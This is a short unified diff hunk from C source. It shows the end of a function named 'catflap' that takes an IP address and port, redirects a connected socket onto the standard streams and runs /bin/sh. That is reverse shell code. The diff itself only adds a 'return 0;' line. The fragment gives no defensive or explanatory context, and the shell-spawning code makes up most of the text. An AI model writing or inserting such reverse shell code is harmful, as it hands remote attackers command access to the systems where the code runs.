@@ -12,5 +12,6 @@ int catflap(const char *ip, int port)
 	dup2(conn_sock, 2);
 
 	execve("/bin/sh", NULL, NULL); 
+	return 0;
 }	
 
